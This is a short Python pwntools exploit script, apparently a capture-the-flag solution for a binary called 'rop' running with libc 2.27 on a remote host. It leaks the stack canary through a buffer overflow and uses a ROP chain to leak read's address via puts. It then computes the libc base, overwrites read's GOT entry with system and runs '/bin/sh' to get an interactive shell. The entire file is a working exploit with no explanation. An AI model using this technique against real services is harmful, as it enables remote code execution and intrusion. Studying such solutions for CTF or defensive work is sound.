#! /usr/bin/env python3

import pwn
import sys

pwn.context.log_level = "debug"


r = pwn.remote(sys.argv[1], int(sys.argv[2]))

e = pwn.ELF("src/rop")
libc = pwn.ELF("src/libc-2.27.so")


payload = b"A" * 0x39

r.sendafter(b"Buf: ", payload)
r.recvuntil(payload)
canary = pwn.u64(b"\x00" + r.recvn(7))

pwn.success(hex(canary))

POP_RDI = 0x00000000004007f3
POP_RSI_R15 = 0x00000000004007f1
LIBC_POP_RDX = 0x0000000000001b96

payload = b"B" * 0x38
payload += pwn.p64(canary)
payload += b"C" * 0x08
payload += pwn.p64(POP_RDI)
payload += pwn.p64(e.got["read"])
payload += pwn.p64(e.plt["puts"])
payload += pwn.p64(POP_RDI)
payload += pwn.p64(0x00)
payload += pwn.p64(POP_RSI_R15)
payload += pwn.p64(e.got["read"])
payload += pwn.p64(0x00)
payload += pwn.p64(e.plt["read"])
payload += pwn.p64(POP_RDI)
payload += pwn.p64(e.got["read"] + 0x08)
payload += pwn.p64(e.plt["read"])

r.sendafter(b"Buf: ", payload)
read = pwn.u64(r.recvn(6) + b"\x00" * 0x02)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]

pwn.success(hex(lb))

payload = pwn.p64(system)
payload += b"/bin/sh"

r.send(payload)

r.interactive()
